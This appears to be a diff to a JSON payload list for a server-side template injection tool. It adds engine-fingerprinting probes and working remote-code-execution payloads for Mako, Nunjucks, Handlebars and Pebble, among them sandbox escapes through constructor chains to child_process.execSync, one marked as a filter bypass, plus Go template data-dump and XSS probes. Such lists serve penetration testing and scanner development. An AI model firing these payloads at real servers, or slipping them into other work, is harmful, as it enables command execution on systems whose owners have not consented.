@@ -81,6 +81,54 @@
       "payloads": [
         {"payload": "{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd) %}{{bytes}}", "description": "RCE via Pebble reflection chain through Integer.TYPE to Runtime.exec", "waf_bypass": false}
       ]
+    },
+    "detection": {
+      "description": "Polyglot detection payloads to fingerprint which template engine is in use — test these first before engine-specific exploitation",
+      "payloads": [
+        {"payload": "${{<%[%'\"}}%\\", "description": "Universal polyglot probe — triggers errors or renders distinctly in most template engines, helps identify which one is active", "waf_bypass": false},
+        {"payload": "{{7*7}}", "description": "Jinja2/Twig/Nunjucks/Handlebars probe — returns 49 in Jinja2/Twig/Nunjucks, literal in Handlebars", "waf_bypass": false},
+        {"payload": "{{7*'7'}}", "description": "Jinja2 vs Twig differentiator — Jinja2 returns '7777777' (string repeat), Twig returns 49 (numeric multiply)", "waf_bypass": false},
+        {"payload": "${7*7}", "description": "FreeMarker/Mako/EL probe — returns 49 in FreeMarker, Mako, and Java Expression Language", "waf_bypass": false},
+        {"payload": "<%= 7*7 %>", "description": "ERB/EJS probe — returns 49 in Ruby ERB and Node.js EJS templates", "waf_bypass": false},
+        {"payload": "#{7*7}", "description": "Ruby string interpolation / Pug / Slim probe — returns 49 in Ruby #{} contexts and Pug templates", "waf_bypass": false},
+        {"payload": "{7*7}", "description": "Smarty probe — returns 49 in PHP Smarty templates (single braces)", "waf_bypass": false},
+        {"payload": "#set($x=7*7)${x}", "description": "Velocity probe — returns 49 in Apache Velocity via variable assignment and interpolation", "waf_bypass": false}
+      ]
+    },
+    "mako": {
+      "description": "Server-Side Template Injection payloads for Python Mako template engine",
+      "payloads": [
+        {"payload": "${7*7}", "description": "Basic arithmetic probe — returns 49 in Mako expression context", "waf_bypass": false},
+        {"payload": "<%import os%>${os.popen('id').read()}", "description": "RCE via Python import in Mako module block — executes system command", "waf_bypass": false},
+        {"payload": "${__import__('os').popen('id').read()}", "description": "RCE via __import__ in expression — shorter alternative without module block", "waf_bypass": false},
+        {"payload": "<%!import subprocess%>${subprocess.check_output('id',shell=True).decode()}", "description": "RCE via subprocess module in Mako module-level block", "waf_bypass": false}
+      ]
+    },
+    "nunjucks": {
+      "description": "Server-Side Template Injection payloads for Node.js Nunjucks template engine",
+      "payloads": [
+        {"payload": "{{range.constructor(\"return 7*7\")()}}", "description": "Nunjucks sandbox escape via range.constructor — accesses Function constructor for code execution", "waf_bypass": false},
+        {"payload": "{{range.constructor(\"return this\")().process.mainModule.require('child_process').execSync('id')}}", "description": "RCE via constructor chain — escapes sandbox to access process.mainModule for command execution", "waf_bypass": false},
+        {"payload": "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id').toString()\")()}}", "description": "RCE via global.process — alternative path using global object reference", "waf_bypass": false},
+        {"payload": "{{range.constructor(\"return this.constructor.constructor('return this.process')().mainModule.require('child_process').execSync('id').toString()\")()}}", "description": "Double constructor chain RCE — additional indirection to bypass simple constructor filters", "waf_bypass": true}
+      ]
+    },
+    "handlebars": {
+      "description": "Server-Side Template Injection payloads for Handlebars template engine (Node.js)",
+      "payloads": [
+        {"payload": "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').execSync('id');\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}", "description": "Handlebars RCE via lookup helper — chains string.sub constructor to execute arbitrary code", "waf_bypass": false},
+        {"payload": "{{#with (lookup this \"constructor\")}}{{#with (call this \"return process\")}}{{mainModule.require.main.require(\"child_process\").execSync(\"id\")}}{{/with}}{{/with}}", "description": "Handlebars RCE via constructor lookup — shorter gadget chain using call helper", "waf_bypass": false},
+        {"payload": "{{this.constructor.constructor('return this.process.mainModule.require(\"child_process\").execSync(\"id\").toString()')(this)}}", "description": "Direct constructor chain — simpler RCE when helpers are not restricted", "waf_bypass": false}
+      ]
+    },
+    "golang": {
+      "description": "Server-Side Template Injection payloads for Go html/template and text/template",
+      "payloads": [
+        {"payload": "{{.}}", "description": "Dump template data object — reveals all fields passed to the template", "waf_bypass": false},
+        {"payload": "{{printf \"%s\" \"SSTI_PROBE\"}}", "description": "Printf probe — confirms template injection by rendering controlled string", "waf_bypass": false},
+        {"payload": "{{printf \"%v\" .}}", "description": "Verbose data dump — prints all template data with Go default formatting", "waf_bypass": false},
+        {"payload": "{{html \"<script>alert(1)</script>\"}}", "description": "XSS via html function in text/template — html/template auto-escapes but text/template does not", "waf_bypass": false}
+      ]
     }
   }
 }
